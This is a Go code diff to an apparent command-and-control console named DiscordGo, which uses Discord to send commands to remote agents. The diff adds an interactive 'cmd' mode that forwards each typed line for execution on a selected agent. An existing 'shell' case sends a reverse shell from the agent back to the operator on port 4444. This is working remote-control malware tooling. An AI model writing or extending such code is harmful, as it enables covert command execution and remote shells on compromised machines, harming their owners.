@@ -21,9 +21,6 @@ var Prompt *readline.Instance
 //TODO: COMMAND GRouPING based on hostname
 // like send "shutdown " to all web host
 
-//TODO: when you type "cmd"
-// Start another prompt named "cmd" 
-// instead of typing cmd <command> all the time
 
 // Taking from their example
 func filterInput(r rune) (rune, bool) {
@@ -66,6 +63,7 @@ func AgentCompleter() {
 	completer = readline.NewPrefixCompleter(
 		readline.PcItem("help"),
 		readline.PcItem("exit"),
+		readline.PcItem("command"),
 		readline.PcItem("agents"),
 		readline.PcItem("interact",
 			items...),
@@ -135,14 +133,13 @@ func Shell(dg *discordgo.Session) {
 				case "help":
 					mainMenuHelp()
 				case "exit":
-					fmt.Println("Exiting.")
+					fmt.Println("Exiting...")
 					os.Exit(0)
 				case "interact":
 					if len(cmd) > 1 {
 						// if uuid is given, check if that UUID exist
 						if agents.DoesAgentExist(cmd[1]) {
 							focusedAgent = cmd[1]
-							// TODO: Fix color scheme
 							Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + cmd[1] + "\033[31m]>> \033[0m")
 							promtpState = "agent"
 						} else {
@@ -165,20 +162,9 @@ func Shell(dg *discordgo.Session) {
 				case "back":
 					Prompt.SetPrompt("\033[31mDiscordGo>>> \033[0m")
 					promtpState = "main"
-				case "cmd":
-					if len(cmd) > 1 {
-						fmt.Println("command: ")
-						fmt.Println(cmd[1:])
-						fmt.Println("Target: " + focusedAgent)
-						finalCmd := ""
-						for _, precmd := range cmd {
-							finalCmd += precmd + " "
-						}
-						finalCmd = strings.TrimSpace(finalCmd)
-						message.CommandMessage(dg, focusedAgent, finalCmd)
-					} else {
-						fmt.Println("Please provide the command you need executed")
-					}
+				case "command": // this cmd starts the cmd prompt
+					Prompt.SetPrompt("\033[31mCMD[\033[32m" + focusedAgent + "\033[31m]>> \033[0m")
+					promtpState = "cmd"
 				case "shell":
 					fmt.Println("sending a shell to you on port 4444")
 					message.SendShell(dg, focusedAgent, util.GetLocalIP())
@@ -191,6 +177,16 @@ func Shell(dg *discordgo.Session) {
 				case "agents":
 					listAgents()
 				}
+			case "cmd": // this is different cmd from above
+				switch cmd[0] {
+				case "back":
+					Prompt.SetPrompt("\033[31mDiscordGo[\033[32m" + focusedAgent + "\033[31m]>> \033[0m")
+					promtpState = "agent"
+				default:
+					finalCmd := strings.TrimSpace(strings.Join(cmd, " "))
+					message.CommandMessage(dg, focusedAgent, finalCmd)
+				} 
+				println("yeet")
 			}
 		}
 	}
